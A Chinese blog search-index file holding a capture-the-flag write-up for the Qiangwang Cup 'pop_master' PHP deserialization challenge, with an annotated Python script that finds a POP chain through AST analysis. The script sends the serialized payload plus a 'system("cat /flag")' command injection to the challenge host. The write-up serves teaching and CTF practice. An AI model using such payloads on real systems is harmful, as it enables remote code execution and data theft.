<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>21年强网杯pop_master</title>
    <link href="/2023/12/14/21%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AFpop-master/"/>
    <url>/2023/12/14/21%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AFpop-master/</url>
    
    <content type="html"><![CDATA[<h3 id="21年强网杯-pop-master"><a href="#21年强网杯-pop-master" class="headerlink" title="21年强网杯 pop_master"></a>21年强网杯 pop_master</h3><p>这道题花了我三四天的时间(当然主要是忙里抽闲)才勉强算得上理解，作者主要想提供一个思路：通过抽象语法树来进行自动化代码审计，然而据说当时的题解五花八门，基本没有按作者预期的题解，这也导致相关的文章比较难找。。。</p><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>网站直接给出源码，一眼pop链(当然题目也告诉了)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><span class="hljs-comment">//class.php.txt</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;argv&#x27;</span>];<br><span class="hljs-variable">$class</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$class</span>-&gt;<span class="hljs-title function_ invoke__">w78yAw</span>(<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure><p>结构很简单，解题思路也很清晰，找到一条调用链实现任意代码执行即可，bbbbbbbbut！</p><p>按照注释下载源码后，好家伙，17万行代码，一万个类。。。</p><p>很显然肉眼审计不太现实，只能搓个脚本辅助找到一条可用链，然后我就去搜了作者的官方题解</p><p>[强网杯<a href="https://www.anquanke.com/post/id/244153">pop_master]与[陀那多]赛题的出题记录</a> </p><p>嘿，您猜怎么着？作者直接把自己的一个项目改过来当解题脚本了，这也就算了，关键这脚本…加起来有一千多行，就两天时间打个比赛，还要我用不熟练的php手搓一个千行脚本吗？？？  </p><p>看的心累，无奈，开始求援，在组内发了自己的问题和求助</p><p><img src="/2023/12/14/21%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AFpop-master/image-20231214193835886.png" alt="image-20231214193835886"></p><p>很好，得到了老学长的帮助，老学长说自己做过这道题，然后甩了个链接 <a href="https://blog.frankli.site/2021/06/15/Misc/libphpserialize/">https://blog.frankli.site/2021/06/15/Misc/libphpserialize/</a></p><p>我一看，霍，一百行，还是py写的，我可太开心了，老学长不愧是老学长，直接给我省了一大堆麻烦，然后开始啃学长的exp。。。</p><p>没！有！注！释！</p><p>估计是打比赛或者临时做题搓的脚本，或者是觉得太简单懒得写注释，总之我要生啃了还好学长的代码格式非常规范，函数命名也都是相关名词或者缩写，简单的让gpt4帮我梳理了下逻辑就差不多理解了，只能说很强，放个学长的exp膜拜一下</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> phpserialize <span class="hljs-keyword">import</span> serialize<br><span class="hljs-keyword">from</span> requests <span class="hljs-keyword">import</span> session<br><br><span class="hljs-keyword">from</span> phply <span class="hljs-keyword">import</span> phplex<br><span class="hljs-keyword">from</span> phply.phpast <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> phply.phpparse <span class="hljs-keyword">import</span> make_parser<br><br>ses = session()<br>classes = &#123;&#125;<br>func2class = &#123;&#125;<br>parser = make_parser()<br>good_paths = []<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    lexer = phplex.lexer.clone()<br>    ast = parser.parse(file.read(), lexer=lexer)<br>    <span class="hljs-keyword">for</span> cls <span class="hljs-keyword">in</span> ast:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cls.nodes:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> Method:<br>                func2class[i.name] = cls.name<br>        classes[cls.name] = cls<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_good_assign</span>(<span class="hljs-params">ctx_param, node: Assignment</span>):<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(node) == Assignment<br>    <span class="hljs-keyword">if</span> ctx_param.name == node.node.name:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(node.expr) == BinaryOp:<br>            <span class="hljs-keyword">if</span> node.expr.op == <span class="hljs-string">&#x27;.&#x27;</span>:<br>                <span class="hljs-keyword">if</span> node.expr.left.name == ctx_param.name:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(node)<br>                <span class="hljs-comment"># unexpected</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(node.expr) == Variable:<br>            <span class="hljs-keyword">if</span> node.expr.name == ctx_param.name:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_if</span>(<span class="hljs-params">ctx_param, node: If</span>):<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(node) == If<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(node.expr) <span class="hljs-keyword">is</span> BinaryOp:<br>        <span class="hljs-comment"># debug</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">str</span>(node.expr.left)+node.expr.op+<span class="hljs-built_in">str</span>(node.expr.right)):<br>            <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> node.node.nodes:<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(n) <span class="hljs-keyword">is</span> Assignment <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> is_good_assign(ctx_param, n):<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(node.expr) <span class="hljs-keyword">is</span> FunctionCall:<br>        <span class="hljs-keyword">if</span> node.expr.name == <span class="hljs-string">&#x27;method_exists&#x27;</span>:<br>            func = node.expr.params[<span class="hljs-number">1</span>].node<br>            <span class="hljs-keyword">assert</span>(<span class="hljs-built_in">type</span>(func) == <span class="hljs-built_in">str</span>)<br>            search(classes[func2class[func]],<br>                   node.expr.params[<span class="hljs-number">0</span>].node.name, func)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;unexpected call&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;unexpected expr&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_method</span>(<span class="hljs-params">ctx, method</span>):<br>    ctx.param = method.params[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> method.nodes:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> For:<br>            <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> i.node.nodes:<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(n) <span class="hljs-keyword">is</span> Assignment <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> is_good_assign(method.params[<span class="hljs-number">0</span>], n):<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> If:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> handle_if(method.params[<span class="hljs-number">0</span>], i):<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> MethodCall:<br>            search(classes[func2class[i.name]], i.node.name, i.name)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> Assignment:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> is_good_assign(method.params[<span class="hljs-number">0</span>], i):<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> Eval:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>(<span class="hljs-params">node, attr, method, path=[]</span>):<br>    path.append((node, attr, method))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> node.nodes:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> Method <span class="hljs-keyword">and</span> i.name == method:<br>            ctx = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;&#x27;</span>, (<span class="hljs-built_in">object</span>,), &#123;&#125;)()<br>            <span class="hljs-keyword">if</span> handle_method(ctx, i):<br>                good_paths.append(<span class="hljs-built_in">list</span>(path))<br>    path.pop()<br><br><br>good_paths = []<br>search(classes[<span class="hljs-string">&#x27;dLEWX3&#x27;</span>], <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;L8IHXt&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(good_paths))<br><span class="hljs-keyword">for</span> n, a, m <span class="hljs-keyword">in</span> good_paths[<span class="hljs-number">0</span>]:<br>    <span class="hljs-built_in">print</span>(n.name, a, m)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">prop_call</span>(<span class="hljs-params">parent, attr, cls</span>):<br>    <span class="hljs-built_in">setattr</span>(parent, attr, <span class="hljs-built_in">type</span>(cls, (<span class="hljs-built_in">object</span>,), &#123;&#125;)())<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(parent, attr)<br><br><br>root = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;dLEWX3&#x27;</span>, (<span class="hljs-built_in">object</span>,), &#123;&#125;)()<br>node = root<br>path = good_paths[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(path)):<br>    node = prop_call(node, path[i][<span class="hljs-number">1</span>], path[i][<span class="hljs-number">0</span>].name)<br><span class="hljs-built_in">print</span>(serialize(root))<br><br><span class="hljs-built_in">print</span>(ses.get(<span class="hljs-string">&#x27;http://my_instance.cloudeci1.ichunqiu.com/&#x27;</span>, params=&#123;<br>    <span class="hljs-string">&#x27;pop&#x27;</span>: serialize(root),<br>    <span class="hljs-string">&#x27;argv&#x27;</span>: <span class="hljs-string">&#x27;system(&quot;cat /flag&quot;); //&#x27;</span>,<br>&#125;).text)<br></code></pre></td></tr></table></figure><p> 学长用了python的 <code>libphpserialize</code> 库，整体思想和作者差不多，先将一万个类转为抽象代码树，然后遍历节点分别判断 <strong>变量赋值，if语句，for语句</strong> 是否会对链的传导产生影响，也就是能否 ‘<strong>消毒</strong>‘，然后通过类似压栈出栈的方式来依次遍历可行路线，最终得到完整链路，并且！还做了自动化生成php序列化payload和自动提交，可以说考虑的及其全面了，接下来我斗胆尝试对学长的代码进行一波分析和学习，并对涉及的概念做个梳理。 </p><h4 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h4><p>首先是相关概念</p><h5 id="抽象语法树-AST"><a href="#抽象语法树-AST" class="headerlink" title="抽象语法树(AST)"></a>抽象语法树(AST)</h5><p>抽象语法树（abstract syntax tree，AST） 是源代码的抽象语法结构的树状表示，树上的每个节点都表示源代码中的一种结构，这所以说是抽象的，是因为抽象语法树并不会表示出真实语法出现的每一个细节，比如说，嵌套括号被隐含在树的结构中，并没有以节点的形式呈现。 抽象语法树并不依赖于源语言的语法，也就是说语法分析阶段所采用的上下文无文文法，因为在写文法时，经常会对文法进行等价的转换（消除左递归，回溯，二义性等），这样会给文法分析引入一些多余的成分，对后续阶段造成不利影响，甚至会使合个阶段变得混乱。因些，很多编译器经常要独立地构造语法分析树，为前端，后端建立一个清晰的接口。 抽象语法树在很多领域有广泛的应用，比如浏览器，智能编辑器，编译器。</p><p>简单来说，把一段代码变成树状结构，类似于 1+2*3 变成这个样子</p><img src="/2023/12/14/21%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AFpop-master/image-20231214200730966.png" alt="image-20231214200730966" style="zoom:50%;"><h5 id="phply"><a href="#phply" class="headerlink" title="phply"></a>phply</h5><p>phply是一个运行在python上的php源的词法分析器和解析器，可以把php代码解析成类似上图那样的结构，并按照一定的语法进行查找和分析。来段简单的示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> phply <span class="hljs-keyword">import</span> phplex<br><span class="hljs-keyword">from</span> phply.phpparse <span class="hljs-keyword">import</span> make_parser<br><br>php_code=<span class="hljs-string">&quot;&quot;&quot;&lt;?php</span><br><span class="hljs-string">$a=1+2*3;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>lexer = phplex.lexer.clone()<br>parser = make_parser()<br>ast = parser.parse(php_code, lexer=lexer)<br><span class="hljs-built_in">print</span>(ast)<br><br><span class="hljs-comment"># 输出结果</span><br><span class="hljs-comment"># [Assignment(Variable(&#x27;$a&#x27;), BinaryOp(&#x27;+&#x27;, 1, BinaryOp(&#x27;*&#x27;, 2, 3)), False)]</span><br></code></pre></td></tr></table></figure><p>可以看到，<code>variable</code>变量1,2,3 经过 <code>binaryOp</code>二元操作符 <code>*</code> 和 <code>+</code> 处理后 ，<code>assignment</code> 赋值给 <code>variable</code> 变量 <code>$a</code> 。</p><p>再来个稍微复杂的语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">php_code=<span class="hljs-string">&quot;&quot;&quot;&lt;?php</span><br><span class="hljs-string">if(2&gt;1)&#123;</span><br><span class="hljs-string">$a=1+2*3;</span><br><span class="hljs-string">$b=23;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># [If(BinaryOp(&#x27;&gt;&#x27;, 2, 1), Block([Assignment(Variable(&#x27;$a&#x27;), BinaryOp(&#x27;+&#x27;, 1, BinaryOp(&#x27;*&#x27;, 2, 3)), False), Assignment(Variable(&#x27;$b&#x27;), 23, False)]), [], None)]</span><br></code></pre></td></tr></table></figure><p>每个 <code>[]</code> 分隔开一个代码块，for 也差不多</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">php_code=<span class="hljs-string">&quot;&quot;&quot;&lt;?php</span><br><span class="hljs-string">for($i = 0; $i &lt; 13; $i ++)&#123;</span><br><span class="hljs-string">$a=1+2*3;</span><br><span class="hljs-string">$b=23;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># [For([Assignment(Variable(&#x27;$i&#x27;), 0, False)], [BinaryOp(&#x27;&lt;&#x27;, Variable(&#x27;$i&#x27;), 13)], [PostIncDecOp(&#x27;++&#x27;, Variable(&#x27;$i&#x27;))], Block([Assignment(Variable(&#x27;$a&#x27;), BinaryOp(&#x27;+&#x27;, 1, BinaryOp(&#x27;*&#x27;, 2, 3)), False), Assignment(Variable(&#x27;$b&#x27;), 23, False)]))]</span><br></code></pre></td></tr></table></figure><h5 id="代码解析"><a href="#代码解析" class="headerlink" title="代码解析"></a>代码解析</h5><p>好了，剩下的通过代码来学习吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    lexer = phplex.lexer.clone()<br>    ast = parser.parse(file.read(), lexer=lexer)<br>    <span class="hljs-keyword">for</span> cls <span class="hljs-keyword">in</span> ast:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cls.nodes:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> Method:<br>                func2class[i.name] = cls.name<br>        classes[cls.name] = cls<br></code></pre></td></tr></table></figure><p>固定格式没啥说的，这一步的预处理是将所有的 <code>类</code> 和 <code>函数</code> 单独抽出来，分别作了 <code>类名=&gt;类节点</code> 和 <code>函数名=&gt;类名</code> 的字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_good_assign</span>(<span class="hljs-params">ctx_param, node: Assignment</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;判断赋值操作是否可继续利用&quot;&quot;&quot;</span><br>    <br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(node) == Assignment<span class="hljs-comment"># 判断为赋值操作</span><br>    <span class="hljs-keyword">if</span> ctx_param.name == node.node.name:<span class="hljs-comment"># 判断改变的参数是否为所需参数</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(node.expr) == BinaryOp:<span class="hljs-comment"># 判断等号右边是否为 二元操作</span><br>            <span class="hljs-keyword">if</span> node.expr.op == <span class="hljs-string">&#x27;.&#x27;</span>:<span class="hljs-comment"># 判断是否为 . 连接操作</span><br>                <span class="hljs-keyword">if</span> node.expr.left.name == ctx_param.name:<span class="hljs-comment"># 判断 . 左侧的是否为所需参数</span><br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(node)<br>                <span class="hljs-comment"># unexpected</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(node.expr) == Variable:<span class="hljs-comment"># 判断是否为变量直接赋值</span><br>            <span class="hljs-keyword">if</span> node.expr.name == ctx_param.name:<span class="hljs-comment"># 判断等号右边是否为所需参数</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p> 判断 <strong>赋值操作</strong> 是否能够正常传递参数内容，即是否不 <strong>消毒</strong> </p><ul><li>若等号左侧不是所需参数，则赋值无影响，返回 True</li><li>若等号右侧为 . 连接操作，且 . 的左侧是所需参数，则赋值相当于参数加后缀，不影响代码执行，返回True</li><li>若等号右侧为 变量 且为所需参数，则赋值等同于转化，不影响代码执行，返回 True</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_if</span>(<span class="hljs-params">ctx_param, node: If</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;判断if语句是否可用&quot;&quot;&quot;</span><br>    <br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(node)== If<span class="hljs-comment"># 节点类型为 if</span><br>    <br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(node.expr) <span class="hljs-keyword">is</span> BinaryOp:<span class="hljs-comment"># if条件是否为二元操作</span><br>        <span class="hljs-comment"># 若二元操作的计算结果为真，且if代码块中有赋值操作，赋值操作消毒成功，则返回 False，否则均返回True</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">str</span>(node.expr.left)+node.expr.op+<span class="hljs-built_in">str</span>(node.expr.right)):<br>            <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> node.node.nodes:<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(n) <span class="hljs-keyword">is</span> Assignment <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> is_good_assign(ctx_param, n):<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>                <br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(node.expr) <span class="hljs-keyword">is</span> FunctionCall:<span class="hljs-comment"># 是否为函数调用</span><br>        <span class="hljs-comment"># 此处由于题目生成规律，if条件中的函数调用只会检测是否存在，且检测后一定执行</span><br>        <span class="hljs-comment"># 先判断是否为预期情况，然后提取出打算调用的函数名，找到对应的类，并将所调用的参数一并传入search模块</span><br>        <span class="hljs-keyword">if</span> node.expr.name == <span class="hljs-string">&#x27;method_exists&#x27;</span>:<br>            func = node.expr.params[<span class="hljs-number">1</span>].node<br>            <span class="hljs-keyword">assert</span>(<span class="hljs-built_in">type</span>(func) == <span class="hljs-built_in">str</span>)<br>            search(classes[func2class[func]],<br>                   node.expr.params[<span class="hljs-number">0</span>].node.name, func)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;unexpected call&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;unexpected expr&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>判断if语句是否不影响代码执行</p><ul><li>题目中的if只有两种情况：判断二元操作并赋值，判断函数是否存在并调用</li><li>针对二元操作，先判断能否进入代码块，在判断代码块里的赋值操作是否有效</li><li>针对函数调用，直接进入目标类中搜寻被调函数，完成点到点的连接(最后形成调用链)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_method</span>(<span class="hljs-params">ctx, method</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;判断当前方法是否可用&quot;&quot;&quot;</span><br>    ctx.param = method.params[<span class="hljs-number">0</span>]<span class="hljs-comment"># 暂时不清楚有啥用，看起来没用，但谁知道呢</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> method.nodes:<span class="hljs-comment"># 一个函数里有多行代码，依次判断代码格式并触发相应结局</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> For:<span class="hljs-comment"># for比较好处理，直接看赋值是否有效(因为题目只有赋值)</span><br>            <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> i.node.nodes:<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(n) <span class="hljs-keyword">is</span> Assignment <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> is_good_assign(method.params[<span class="hljs-number">0</span>], n):<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> If:<span class="hljs-comment"># 调！调上面的模块</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> handle_if(method.params[<span class="hljs-number">0</span>], i):<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> MethodCall:<span class="hljs-comment"># 继续调！</span><br>            search(classes[func2class[i.name]], i.node.name, i.name)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> Assignment:<span class="hljs-comment"># 还在调！</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> is_good_assign(method.params[<span class="hljs-number">0</span>], i):<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span 